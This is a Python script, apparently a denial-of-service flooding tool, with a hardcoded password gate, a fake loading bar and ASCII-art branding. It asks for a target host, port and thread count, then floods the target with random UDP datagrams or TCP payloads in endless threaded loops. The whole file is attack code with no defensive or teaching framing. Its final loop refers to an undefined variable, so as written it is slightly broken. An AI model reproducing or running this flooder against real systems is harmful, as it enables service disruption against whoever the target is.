#!/usr/bin/env python3
import random
import socket
import threading
import os
import time

os.system("clear")

pasw = "Gzaaxyz"

for i in range(3):
    pwd = input(" Password : ")
    j = 3
    if (pwd == pasw):
        time.sleep(2)
        print("[0] Loading.......")
        time.sleep(1)
        print("[10] Loading......")
        time.sleep(1)
        print("[20] Loading.......")
        time.sleep(1)
        print("[30] Loading.......")
        time.sleep(1)
        print("[40] Loading.......")
        time.sleep(1)
        print("[50] Loading.......")
        time.sleep(1)
        print("[60] Loading.......")
        time.sleep(1)
        print("[70] Loading.......")
        time.sleep(1)
        print("[80] Loading.......")
        time.sleep(1)
        print("[90] Loading.......")
        time.sleep(1)
        print("[100] Processing\n")
        time.sleep(3)
        break
    else:
        time.sleep(2)
        print("[x] Wrong Password \n")
        continue
time.sleep(2)
print("Succesfull Logins")
time.sleep(2)

print ('''\033[96m 
▒█▀▀█ ▀▀█ █▀▀█ █▀▀█ █░█ █░░█ ▀▀█ 
▒█░▄▄ ▄▀░ █▄▄█ █▄▄█ ▄▀▄ █▄▄█ ▄▀░ 
▒█▄▄█ ▀▀▀ ▀░░▀ ▀░░▀ ▀░▀ ▄▄▄█ ▀▀▀  \033[96m''')
ip = str(input("  HOST/ip:"))
port = int(input(" Port:"))
choice = str(input(" (y/n):"))
times = int(input(" Paket:"))
thread = int(input(" Threads:"))
def run():
	data = random._urandom(600)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" DOWN DEK")
		except:
			print("[!] 𝙂𝙯𝙖𝙖𝙭𝙮𝙯 ")

def run2():
	data = random._urandom(3016)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" DOWN DEK")
		except:
			s.close()
			print("[*] 𝙂𝙯𝙖𝙖𝙭𝙮𝙯 ")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()